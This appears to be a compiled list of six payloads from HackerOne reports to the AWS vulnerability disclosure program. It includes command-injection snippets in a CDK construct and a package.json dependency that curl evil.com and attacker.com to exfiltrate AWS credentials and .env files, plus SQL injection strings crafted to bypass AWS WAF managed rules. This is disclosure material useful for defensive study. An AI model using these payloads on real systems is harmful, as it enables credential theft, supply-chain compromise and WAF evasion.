# AWS VDP

6 payloads.

### `62abe80b`

```
// Published as "convenient-lambda" on npm
import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';

export class ConvenientLambda extends NodejsFunction {
  constructor(scope, id, props) {
    super(scope, id, {
      ...props,
      bundling: {
        ...props.bundling,
        externalModules: [
          ...(props.bundling?.externalModules ?? []),
          // Attacker payload hidden among legitimate-looking externals
          'lodash & curl https://evil.com/exfil?data=$(cat ~/.aws/
```

— [Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`](https://hackerone.com/reports/3558713) · AWS VDP · [inkerton](https://hackerone.com/inkerton)

### `e4aaab05`

```
alice' OR 1=1--
```

— [SQL Injection Detection Bypass in AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet)](https://hackerone.com/reports/3591725) · AWS VDP · [killnet-edc](https://hackerone.com/killnet-edc)

### `2c4d75f6`

```
alice' || '1' ; && 1<=>0 && 1-1 && 1<=>1 && 1#
```

— [SQL Injection Detection Bypass in AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet)](https://hackerone.com/reports/3591725) · AWS VDP · [killnet-edc](https://hackerone.com/killnet-edc)

### `4d0c6994`

```
alice' || '1' ; && 1<=>0 && 1-1 && 1<=>1 && 1#
alice' || '1' ; && 2-1<=>2-1 || 0 && 1<=>1-- 
alice' && 1 ; && IFNULL(1,0) || 1<=>0--
...
```

**Parameter:** `username`
— [SQL Injection Detection Bypass in AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet)](https://hackerone.com/reports/3591725) · AWS VDP · [killnet-edc](https://hackerone.com/killnet-edc)

### `e13d715b`

```
"Condition": {
    "StringEquals": {
        "aws:SourceAccount": "{{ account_id }}"
    },
    "ArnLike": {
        "aws:SourceArn": "arn:aws:bedrock-agentcore:{{ region }}:{{ account_id }}:*"
    }
}
```

— [Bedrock AgentCore Starter Toolkit Creates Gateway IAM Roles Without Confused Deputy Protections](https://hackerone.com/reports/3632577) · AWS VDP · [mistercloudsec](https://hackerone.com/mistercloudsec)

### `4b7646c5`

```
{
  "name": "@company/analytics-helper",
  "version": "2.1.0",
  "dependencies": {
    "lodash": "4.17.21' && curl https://attacker.com/exfil?d=$(cat /asset-input/.env|base64) && echo '"
  }
}
```

— [OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)](https://hackerone.com/reports/3637898) · AWS VDP · [kaporia](https://hackerone.com/kaporia)
